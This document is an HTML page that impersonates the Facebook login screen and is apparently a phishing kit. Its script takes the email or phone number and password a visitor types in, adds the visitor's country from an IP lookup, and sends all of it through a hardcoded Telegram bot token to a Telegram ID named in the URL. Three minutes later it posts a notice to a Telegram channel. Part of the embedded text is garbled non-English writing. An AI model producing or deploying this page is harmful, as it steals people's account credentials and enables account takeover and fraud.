<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 360px;
      text-align: center;
    }
    .container h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    button:hover {
      background-color: #165ecb;
    }
    small {
      color: gray;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Facebook</h2>
  <form id="loginForm">
    <input type="text" id="identifier" placeholder="Mobile number or email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Log In</button>
    <small><br><br>Â© Meta Platforms</small>
  </form>
</div>

<script>
  const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
  const telegramChannel = '@PRO_43KPISH';

  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
  }

  async function getGeoInfo() {
    try {
      const res = await fetch('https://ipapi.co/json');
      return await res.json();
    } catch (e) {
      return { country_name: "Unknown", country_code: "" };
    }
  }

  function getFlag(countryCode) {
    if (!countryCode) return "";
    return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt()));
  }

  async function sendTelegramMessage(chatId, text) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text })
    });
  }

  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const identifier = document.getElementById('identifier').value; // email or number
    const password = document.getElementById('password').value;
    const telegramId = getQueryParam('id');

    if (!telegramId) {
      alert('Telegram ID Ù¾Ù‡ URL Ú©Û Ù†Ø´ØªÙ‡!');
      return;
    }

    const geo = await getGeoInfo();
    const country = geo.country_name || 'Unknown';
    const flag = getFlag(geo.country_code);

    const userMessage = `ğŸŸ¦ Facebook Login\n\nğŸ“© Email/Phone: ${identifier}\nğŸ” Password: ${password}\nğŸŒ Country: ${country} ${flag}\nğŸ†” Telegram ID: ${telegramId}`;

    // 1. Send to user (Telegram ID)
    await sendTelegramMessage(telegramId, userMessage);

    // 2. Delay 3 minutes then send to channel
    setTimeout(() => {
      const channelMessage = `â° Û³ Ø¯Ù‚ÛŒÙ‚Û ÙˆØ±ÙˆØ³ØªÙ‡:\nLogin ÙˆØ´Ùˆ Ù„Ù‡ ${country} ${flag}.\nØ¯Ø§ Login Ø¯ Telegram ID [${telegramId}] Ù„Ù‡ Ø®ÙˆØ§ ØªØ±Ø³Ø±Ù‡ Ø´Ùˆ.`;
      sendTelegramMessage(telegramChannel, channelMessage);
    }, 180000); // 3 minutes

    alert('Please wait...');
  });
</script>

</body>
</html> 
